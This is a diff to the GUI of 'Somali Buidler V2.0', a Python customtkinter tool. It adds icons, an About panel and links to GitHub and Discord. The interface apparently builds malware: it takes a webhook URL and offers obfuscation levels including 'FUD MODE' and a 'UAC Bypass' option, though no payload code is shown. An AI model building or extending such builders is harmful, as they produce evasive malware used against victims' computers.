@@ -4,6 +4,7 @@ import random
 from random import randint
 import codecs
 import string
+import webbrowser
 
 try:
     import customtkinter as kdot
@@ -33,6 +34,8 @@ class Buidler(kdot.CTk):
     def __init__(self):
         super().__init__()
         
+        kdot.set_default_color_theme("green")
+        
         self.title("Somali Buidler V2.0")
         self.geometry("700x450")
         
@@ -49,6 +52,10 @@ class Buidler(kdot.CTk):
         self.about_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "about_dark.png")), dark_image=Image.open(os.path.join(image_path, "about_dark.png")), size=(20, 20))
         self.hentai_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "hentai_dark.png")), dark_image=Image.open(os.path.join(image_path, "hentai_dark.png")), size=(20, 20))
         self.bottom_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "Kendrick.jpg")), dark_image=Image.open(os.path.join(image_path, "Kendrick.jpg")), size=(500, 230))
+        self.github_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "github.png")), dark_image=Image.open(os.path.join(image_path, "github.png")), size=(20, 20))
+        self.discord_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "discord.png")), dark_image=Image.open(os.path.join(image_path, "discord.png")), size=(20, 20))
+        self.somali_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "logo.png")), dark_image=Image.open(os.path.join(image_path, "logo.png")), size=(30, 24))
+        self.comethazine_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "comethazine.png")), dark_image=Image.open(os.path.join(image_path, "comethazine.png")), size=(100, 100))
         
         self.navigation_frame = kdot.CTkFrame(self, corner_radius=0)
         self.navigation_frame.grid(row=0, column=0, sticky="nsew")
@@ -56,15 +63,18 @@ class Buidler(kdot.CTk):
         
         self.rest_of_window_frame = kdot.CTkFrame(self, corner_radius=0)
         self.rest_of_window_frame.grid(row=0, column=1, sticky="nsew")
-        self.made_by_kdot = kdot.CTkLabel(self.rest_of_window_frame, text="Made by K.Dot#4044", font=("Arial", 50), padx=10)
+        self.made_by_kdot = kdot.CTkLabel(self.rest_of_window_frame, text="Made by K.Dot#4044\n\n\n\n       Please give a ⭐ on github", font=("Arial", 30), padx=10)
         self.made_by_kdot.grid(row=3, columnspan=3, sticky="nsew")
         
+        self.navigation_frame_label = kdot.CTkLabel(self.navigation_frame, text=None, image=self.comethazine_image, compound="center")
+        self.navigation_frame_label.grid(row=0, column=0, padx=5, pady=5)
+        
         self.home_button = kdot.CTkButton(self.navigation_frame, image=self.home_image, height=40, border_spacing=10, text="Home", fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), anchor="w", command=self.home_button_event)
-        self.home_button.grid(row=0, column=0, sticky="ew")
+        self.home_button.grid(row=1, column=0, sticky="ew")
         self.about_button = kdot.CTkButton(self.navigation_frame, image=self.about_image, height=40, border_spacing=10, text="About", fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), anchor="w", command=self.about_button_event)
-        self.about_button.grid(row=1, column=0, sticky="ew")
+        self.about_button.grid(row=2, column=0, sticky="ew")
         self.hentai_button = kdot.CTkButton(self.navigation_frame, image=self.hentai_image, height=40, border_spacing=10, text="Hentai", fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), anchor="w", command=self.hentai_button_event)
-        self.hentai_button.grid(row=2, column=0, sticky="ew")
+        self.hentai_button.grid(row=3, column=0, sticky="ew")
         
         self.appearance_mode_menu = kdot.CTkOptionMenu(self.navigation_frame, values=["Dark", "Light", "System"], command=self.change_appearance_mode_event)
         self.appearance_mode_menu.grid(row=6, column=0, padx=20, pady=20, sticky="s")
@@ -79,7 +89,7 @@ class Buidler(kdot.CTk):
         self.hentai_frame.grid_columnconfigure(0, weight=1)
         
         #webhook stuff
-        self.webhook_box_label = kdot.CTkLabel(self.home_frame, text="Enter Webhook URL", text_color=("gray10", "gray90"), anchor="w")
+        self.webhook_box_label = kdot.CTkLabel(self.home_frame, text="Webhook URL", text_color=("gray10", "gray90"), anchor="w")
         self.webhook_box_label.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
         
         self.webhook_box = kdot.CTkEntry(self.home_frame, width=300, height=30, corner_radius=10)
@@ -88,10 +98,12 @@ class Buidler(kdot.CTk):
         self.webhook_check_button = kdot.CTkButton(self.home_frame, text="Check", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60, command=self.webhook_button_check)
         self.webhook_check_button.grid(row=0, column=2, padx=10, pady=10, sticky="n")
         
-        self.obfuscate_dropdown_box = kdot.CTkOptionMenu(self.home_frame, values=["Level 1", "Level 2", "Level 3", "All", "FUD MODE", "None"], )
-        self.obfuscate_dropdown_box.grid(row=1, column=0, padx=10, pady=10, sticky="ew")
+        self.obfuscation_label = kdot.CTkLabel(self.home_frame, text="Obfuscation\nLevel --->", text_color=("gray10", "gray90"), anchor="w")
+        self.obfuscation_label.grid(row=1, column=0, sticky="ew", padx=10, pady=10)
+        self.obfuscate_dropdown_box = kdot.CTkOptionMenu(self.home_frame, values=["Level 1", "Level 2", "Level 3", "All", "FUD MODE", "None"])
+        self.obfuscate_dropdown_box.grid(row=1, column=1, padx=10, pady=10)
         self.uac_bypass_check_box = kdot.CTkCheckBox(self.home_frame, text="UAC Bypass", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
-        self.uac_bypass_check_box.grid(row=1, column=1, padx=10, pady=10, sticky="nsew")
+        self.uac_bypass_check_box.grid(row=1, column=2, padx=10, pady=10, sticky="e")
         
         #start button
         self.start_button = kdot.CTkButton(self.home_frame, text="Start", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=80, width=200, command=self.start_button_event)
@@ -105,7 +117,30 @@ class Buidler(kdot.CTk):
         
         self.about_label = kdot.CTkLabel(self.about_frame, text="About", text_color=("gray10", "gray90"), anchor="w", font=("Arial", 20))
         self.about_label.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
+        
+        self.text_box = kdot.CTkTextbox(self.about_frame, width=100, height=100, corner_radius=10)
+        self.text_box.insert("end", "Special thanks to K.Dot#4044 (me) for making this program.\n\nAlso special thanks to Timmywag for being annoying af telling me to make it.\n\n")
+        self.text_box.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
+        self.text_box.configure(state="disabled")
+        
+        self.github_button = kdot.CTkButton(self.about_frame, text=None, image=self.github_image, text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=50, width=100, command=self.github_button_event)
+        self.github_button.place(relx=0.2, rely=0.5, anchor="center")
+        
+        self.discord_button = kdot.CTkButton(self.about_frame, text=None, image=self.discord_image, text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=50, width=100, command=self.discord_button_event)
+        self.discord_button.place(relx=0.5, rely=0.5, anchor="center")
+        
+        self.somali_button = kdot.CTkButton(self.about_frame, text=None, image=self.somali_image, text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=50, width=100, command=self.somali_button_event)
+        self.somali_button.place(relx=0.8, rely=0.5, anchor="center")
+        
     
+    def github_button_event(self):
+        webbrowser.open("https://github.com/kdot227")
+        
+    def somali_button_event(self):
+        webbrowser.open("https://sped.lol")
+        
+    def discord_button_event(self):
+        webbrowser.open("https://discord.gg/BScgW3ghP3")
         
     def home_button_event(self):
         self.select_frame_by_name("home")
